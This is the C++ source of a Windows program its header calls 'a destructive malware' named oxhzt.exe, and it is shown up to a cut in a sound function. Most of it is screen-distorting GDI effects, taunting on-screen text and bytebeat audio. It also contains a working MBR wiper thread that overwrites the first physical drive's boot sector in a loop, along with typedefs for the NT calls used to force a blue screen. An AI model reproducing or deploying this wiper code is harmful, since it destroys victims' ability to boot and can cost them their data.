// oxhzt.exe - a destructive malware by VietNamLover.
// This is a destructive malware, don't run it on your real PC!
// If you want to test this malware on your real PC, run the safety version.

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <algorithm>

volatile bool g_running = true;

#ifndef M_PI
#define M_PI 3.14159265358979323846264338327950288
#endif

#define PI M_PI

using namespace std;

// ==================== CUSTOM MBR DATA ====================
unsigned char MasterBootRecord[512] = {
    0x56, 0x49, 0x45, 0x54, 0x4E, 0x41, 0x4D, 0x4C, 0x4F, 0x56, 0x45, 0x52, 0x20, 0x57, 0x41, 0x53,
    0x20, 0x48, 0x45, 0x52, 0x45, 0x20, 0x2D, 0x20, 0x44, 0x45, 0x4C, 0x54, 0x41, 0x2E, 0x45, 0x58,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct {
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

// ==================== MBR WIPER ====================
DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}
namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed, g = rgb.rgbGreen, b = rgb.rgbBlue;
        FLOAT _r = r/255.f, _g = g/255.f, _b = b/255.f;
        FLOAT rgbMin = std::min(std::min(_r, _g), _b);
        FLOAT rgbMax = std::max(std::max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR, deltaG, deltaB;
        FLOAT h = 0.f, s = 0.f, l = (rgbMax + rgbMin)/2.f;
        
        if (fDelta != 0.f) {
            s = l < .5f ? fDelta/(rgbMax+rgbMin) : fDelta/(2.f-rgbMax-rgbMin);
            deltaR = ((rgbMax - _r)/6.f + fDelta/2.f)/fDelta;
            deltaG = ((rgbMax - _g)/6.f + fDelta/2.f)/fDelta;
            deltaB = ((rgbMax - _b)/6.f + fDelta/2.f)/fDelta;
            if (_r == rgbMax) h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f/3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f/3.f) + deltaG - deltaR;
            if (h < 0.f) h += 1.f; if (h > 1.f) h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }
    
    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb = {0};
        FLOAT r = hsl.l, g = hsl.l, b = hsl.l, h = hsl.h, sl = hsl.s, l = hsl.l;
        FLOAT v = (l <= .5f) ? (l*(1.f+sl)) : (l+sl-l*sl);
        if (v > 0.f) {
            FLOAT m = l+l-v, sv = (v-m)/v;
            h *= 6.f;
            int sextant = (int)h;
            FLOAT fract = h - sextant, vsf = v*sv*fract;
            FLOAT mid1 = m+vsf, mid2 = v-vsf;
            switch (sextant) {
                case 0: r = v; g = mid1; b = m; break;
                case 1: r = mid2; g = v; b = m; break;
                case 2: r = m; g = v; b = mid1; break;
                case 3: r = m; g = mid2; b = v; break;
                case 4: r = mid1; g = m; b = v; break;
                case 5: r = v; g = m; b = mid2; break;
            }
        }
        rgb.rgbRed = (BYTE)(r*255.f);
        rgb.rgbGreen = (BYTE)(g*255.f);
        rgb.rgbBlue = (BYTE)(b*255.f);
        return rgb;
    }
}

// ==================== PAYLOADS ====================

DWORD WINAPI sines1(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            for(float i = 0; i < sw + sh; i += 0.99f) {
                int a = (int)(sin(angle) * 50);
                BitBlt(hdc, 0, (int)i, sw, 1, hdc, a, (int)i, SRCCOPY);
                angle += PI / 60;
            }
            ReleaseDC(0, hdc);
        }
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI payload1(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            int rx = rand() % sw;
            BitBlt(hdc, rx, 10, 100, sh, hdc, rx, 0, SRCCOPY);
            BitBlt(hdc, rx, -10, -100, sh, hdc, rx, 0, SRCCOPY);
            ReleaseDC(0, hdc);
        }
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            int rx = rand() % sw, ry = rand() % sh;
            BitBlt(hdc, rx, 10, 100, sh, hdc, rx, 0, SRCCOPY);
            BitBlt(hdc, rx, -10, -100, sh, hdc, rx, 0, SRCCOPY);
            BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, SRCCOPY);
            BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, SRCCOPY);
            BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
            ReleaseDC(0, hdc);
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI setpixel(LPVOID lpParam) {
    int start = GetTickCount();
    int y = GetSystemMetrics(SM_CYSCREEN), x = GetSystemMetrics(SM_CXSCREEN);
    int inc = (int)round(x / 100.0);
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            for(int yp = 0; yp < y; yp += 2) {
                for(int xp = 0; xp < x; xp += 2) {
                    int xa = inc ^ xp;
                    SetPixel(hdc, xp, yp, RGB(xa, xa, xa));
                }
            }
            ReleaseDC(0, hdc);
        }
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI shader1(LPVOID lpvd) {
    int start = GetTickCount(), i = 0;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    BITMAPINFO bmpi = {0}; bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w; bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    ReleaseDC(NULL, hdc);
    
    while(g_running && GetTickCount() - start < 30000) {
        hdc = GetDC(NULL);
        if(hdc && rgbquad) {
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            for(int x = 0; x < w; x++) {
                for(int y = 0; y < h; y++) {
                    int index = y * w + x;
                    HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                    hslcolor.h = fmod((float)(i * x + y) / 300.f + y/(float)h * 0.1f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
            ReleaseDC(NULL, hdc);
        }
        Sleep(16);
    }
    DeleteObject(bmp); DeleteDC(hdcCopy);
    return 0;
}

DWORD WINAPI circlez(LPVOID lpvd) {
    int start = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xf=0, yf=0, signX=15, signY=5;
    double angle = 0; int radius = 100;
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            xf += signX; yf += signY;
            int centerX = (w/4) - (radius/2) - (w/4), centerY = (h/4) - (radius/2) - (h/4);
            int x = (int)(cos(angle) * radius) + centerX + xf;
            int y = (int)(sin(angle) * radius) + centerY + yf;
            for(int i = 64; i > 8; i -= 8) {
                HBRUSH hbr = CreateSolidBrush(RGB(225, 0, 0));
                SelectObject(hdc, hbr);
                Ellipse(hdc, 50 + x - i, 50 + y - i, 100 + x + i, 100 + y + i);
                DeleteObject(hbr);
            }
            angle = fmod(angle + PI/radius, PI*radius);
            if(yf >= h) signY = -5;
            if(xf >= w) signX = -15;
            if(yf <= 0) signY = 5;
            if(xf <= 0) signX = 15;
            ReleaseDC(0, hdc);
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID lpvd) {
    int start = GetTickCount(), i = 0;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    BITMAPINFO bmpi = {0}; bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w; bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    ReleaseDC(NULL, hdc);
    
    while(g_running && GetTickCount() - start < 30000) {
        hdc = GetDC(NULL);
        if(hdc && rgbquad) {
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            for(int x = 0; x < w; x++) {
                for(int y = 0; y < h; y++) {
                    int index = y * w + x;
                    int fx = (int)((4*i) + ((4*i)*sin(x/16.0)) + (4*i) + ((4*i)*sin(y/8.0)));
                    HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                    hslcolor.h = fmod((float)fx/300.f + y/(float)h*0.1f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
        }
        Sleep(16);
    }
    DeleteObject(bmp); DeleteDC(hdcCopy);
    return 0;
}

DWORD WINAPI payload3(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            int ry = rand() % sh;
            BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, SRCCOPY);
            BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, SRCCOPY);
            ReleaseDC(0, hdc);
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI shader3(LPVOID lpParam) {
    int start = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w*h + w)*sizeof(RGBQUAD), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(NULL);
        if(hdc && data) {
            HDC hdcdc = CreateCompatibleDC(hdc);
            HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
            SelectObject(hdcdc, hbm);
            BitBlt(hdcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            GetBitmapBits(hbm, w*h*4, data);
            for(int i = 0; w*h > i; i++) {
                if(rand() % 110) {
                    int v = rand() % 100;
                    *((BYTE*)data + 4*i + v) -= 5;
                }
            }
            SetBitmapBits(hbm, w*h*4, data);
            BitBlt(hdc, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
            DeleteObject(hbm);
            DeleteDC(hdcdc);
            ReleaseDC(NULL, hdc);
        }
        Sleep(16);
    }
    VirtualFree(data, 0, MEM_RELEASE);
    return 0;
}

DWORD WINAPI shader4(LPVOID lpvd) {
    int start = GetTickCount(), i = 0, n = 10;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    BITMAPINFO bmpi = {0}; bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w; bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    ReleaseDC(NULL, hdc);
    
    while(g_running && GetTickCount() - start < 30000) {
        hdc = GetDC(NULL);
        if(hdc && rgbquad) {
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            for(int x = 0; x < w; x++) {
                for(int y = 0; y < h; y++) {
                    int index = y * w + x;
                    int fx = (int)((4*i) + ((4*i)*sin(x/32.0)) + (4*i) + ((4*i)*sin(y/24.0)));
                    HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                    hslcolor.h = fmod((float)fx/300.f + y/(float)h*0.1f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
            i++;
            StretchBlt(hdc, n, n, w-n*2, h-n*2, hdcCopy, 0, 0, w, h, SRCCOPY);
            n = (n < w) ? n+12 : 4;
            ReleaseDC(NULL, hdc);
        }
        Sleep(16);
    }
    DeleteObject(bmp); DeleteDC(hdcCopy);
    return 0;
}

DWORD WINAPI textouts(LPVOID lpvd) {
    int start = GetTickCount();
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    const char* texts[] = {"oXhxT.eXe iS dEsTrOyiNG yOuR pC!", "gOoDbYe wInDOwS!", "yOuR pC iS gOiNg tO dEaD!", "yOu wILl eNJoY yOUr nEw pC sOoN!!!"};
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            SetBkMode(hdc, TRANSPARENT);
            for(int i = 0; i < 4; i++) {
                SetTextColor(hdc, RGB(rand()%255, rand()%255, rand()%255));
                TextOutA(hdc, rand()%x, rand()%y, texts[i], (int)strlen(texts[i]));
            }
            ReleaseDC(0, hdc);
        }
        Sleep(20);
    }
    return 0;
}

DWORD WINAPI shader5(LPVOID lpvd) {
    int start = GetTickCount(), i = 0;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    BITMAPINFO bmpi = {0}; bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w; bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    ReleaseDC(NULL, hdc);
    
    while(g_running && GetTickCount() - start < 30000) {
        hdc = GetDC(NULL);
        if(hdc && rgbquad) {
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            for(int x = 0; x < w; x++) {
                for(int y = 0; y < h; y++) {
                    int index = y * w + x;
                    HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                    hslcolor.h = fmod((float)(360*i)/300.f + y/(float)h*0.1f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
        }
        Sleep(16);
    }
    DeleteObject(bmp); DeleteDC(hdcCopy);
    return 0;
}

DWORD WINAPI patblt(LPVOID lpParam) {
    int start = GetTickCount();
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(NULL);
        if(hdc) {
            int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
            HBRUSH brush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
            SelectObject(hdc, brush);
            PatBlt(hdc, 0, 0, w, h, PATINVERT);
            DeleteObject(brush);
            ReleaseDC(NULL, hdc);
        }
        Sleep(33);
    }
    return 0;
}

DWORD WINAPI bounce(LPVOID lpParam) {
    int start = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int x = 10, y = 10, signX = 1, signY = 1;
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            x += 10 * signX; y += 10 * signY;
            HBRUSH brush = CreateSolidBrush(RGB(239,0,0));
            SelectObject(hdc, brush);
            Ellipse(hdc, x, y, x+100, y+100);
            if(y >= h-100) signY = -1;
            if(x >= w-100) signX = -1;
            if(y <= 0) signY = 1;
            if(x <= 0) signX = 1;
            DeleteObject(brush);
            ReleaseDC(0, hdc);
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI textout2(LPVOID lpParam) {
    int start = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int x = 10, y = 10, signX = 1, signY = 1;
    LPCSTR lpText = "oXHzT.eXe";
    while(g_running && GetTickCount() - start < 60000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            HBRUSH brush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
            SelectObject(hdc, brush);
            PatBlt(hdc, 0, 0, w, h, PATINVERT);
            DeleteObject(brush);

            x += 10 * signX; y += 10 * signY;
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(rand()%255, rand()%255, rand()%255));
            HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "vIEtnAmloVEr");
            SelectObject(hdc, font);
            TextOutA(hdc, x, y, lpText, (int)strlen(lpText));
            
            if(y >= h-50) signY = -1;
            if(x >= w-200) signX = -1;
            if(y <= 0) signY = 1;
            if(x <= 0) signX = 1;
            
            DeleteObject(font);
            ReleaseDC(0, hdc);
        }
        Sleep(4);
    }
    return 0;
}

DWORD WINAPI sines2(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            for(float i = 0; i < sw + sh; i += 0.99f) {
                int a = (int)(sin(angle) * 40);
                BitBlt(hdc, 0, (int)i, sw, 1, hdc, a, (int)i, SRCCOPY);
                angle += PI / 20;
            }
            ReleaseDC(0, hdc);
        }
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI jpg(LPVOID lpParam) {
    int start = GetTickCount();
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(HWND_DESKTOP);
        if(hdc) {
            int X = GetSystemMetrics(SM_CXSCREEN), Y = GetSystemMetrics(SM_CYSCREEN);
            BitBlt(hdc, rand()%(X), rand()%(Y), rand()%(X), rand()%(Y), 
                   hdc, rand()%(X), rand()%(Y), PATINVERT);
            ReleaseDC(0, hdc);
        }
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI last(LPVOID lpParam) {
    int start = GetTickCount();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while(g_running && GetTickCount() - start < 30000) {
        HDC hdc = GetDC(0);
        if(hdc) {
            for(float i = 0; i < sw + sh; i += 0.99f) {
                int a = (int)(sin(angle) * 360);
                BitBlt(hdc, 0, (int)i, sw, 1, hdc, a, (int)i, SRCCOPY);
                angle += PI / 3;
            }
            ReleaseDC(0, hdc);
        }
        Sleep(16);
    }
    return 0;
}

DWORD WINAPI msg(LPVOID lpParam) {
    int start = GetTickCount();
    while(g_running && GetTickCount() - start < 30000) {
        MessageBoxA(NULL, "tHiS iS tHe fINaL pAYloAd. bSoD iNComiNg...", "oXHzT.eXe", MB_ABORTRETRYIGNORE);
        Sleep(100);
    }
    return 0;
}

// ==================== BYTEBEATS ====================

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>((t ^ (t >> 5)) + ((t << 2) & (t >> 3)));
    WAVEHDR header = {buffer, 8000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>(sin(5 * ((t >> 2) + 15) * t >> 12) * 120);
    WAVEHDR header = {buffer, 8000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[22050 * 30];
    for(DWORD t = 0; t < 22050 * 30; ++t)
        buffer[t] = static_cast<char>((t >> 3) | (t * ((t >> 4) & (t >> 6))) ^ (t >> 2));
    WAVEHDR header = {buffer, 22050 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[22050 * 30];
    for(DWORD t = 0; t < 22050 * 30; ++t)
        buffer[t] = static_cast<char>(((t >> 4) & 3) * (t >> 2) ^ (t / 64 + t));
    WAVEHDR header = {buffer, 22050 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[11025 * 30];
    for(DWORD t = 0; t < 11025 * 30; ++t)
        buffer[t] = static_cast<char>((t ^ (t + t/128)) - (t * (t >> 14)) & 127);
    WAVEHDR header = {buffer, 11025 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>((t * t) / (2 + ((t >> 10) & (t >> 9))) & 255);
    WAVEHDR header = {buffer, 8000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>(((t >> 9) ^ (t >> 10)) * 7 % 127 + ((t >> 13) & 3) * (t % 64));
    WAVEHDR header = {buffer, 8000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>(((t >> 8) | (t * 3)) & ((t >> 6) | (t * 5)) & ((t >> 2) | (t * 7)));
    WAVEHDR header = {buffer, 8000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 30];
    for(DWORD t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>((t * (t >> 4)) ^ (t >> 3));
    WAVEHDR header = {buffer, 8000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[8000 * 60];
    for(DWORD t = 0; t < 8000 * 60; ++t)
        buffer[t] = static_cast<char>((t * ((t >> 5) | (t >> 7) & 15)) & (t << 2));
    WAVEHDR header = {buffer, 8000 * 60, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(60000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0};
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char* buffer = new char[16000 * 30];
    for(DWORD t = 0; t < 16000 * 30; ++t)
        buffer[t] = static_cast<char>((t >> 6) ^ (t >> 4) * (t & 255));
    WAVEHDR header = {buffer, 16000 * 30, 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
